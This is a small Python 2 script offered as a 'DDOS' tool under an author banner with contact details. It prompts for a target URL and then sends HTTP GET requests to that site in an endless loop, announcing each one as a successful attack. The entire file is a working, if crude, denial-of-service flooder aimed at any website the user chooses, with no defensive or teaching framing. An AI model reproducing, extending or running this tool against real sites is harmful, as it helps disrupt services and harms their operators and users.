try:      
    import requests,os,sys,random,time,platform

except:
    print("Import Error :\n please use 'pip install -r requirements.txt' to install requirements")

#Functions
def System_filter():
    system_os = platform.system()
    if system_os == "Windows":
        os.system('cls')

    if system_os == "Linux":
        os.system('clear')


System_filter()
print ("""
        }===============Coded By Abdxslayer==============={
              - http://www.Github.com/ABDXH4K3r
              - Facebook : Abderrahmane Bourri.
              - Email : As8apple@gmail.com.
        }================================================={\n""")
target = raw_input("[+] Target URL (e.g: http://www.google.com) : ")
System_filter()
i=0
def DDOS():
    try:
        r = requests.get(target,timeout=10)
        print ("[+] DDOS {} Has Been Sent Successfully To {} .").format(i,target)
    except:
        print ("[-] We Didn't found the url.")
        x = raw_input()
        exit()

while True:
    i = i+1
    DDOS()
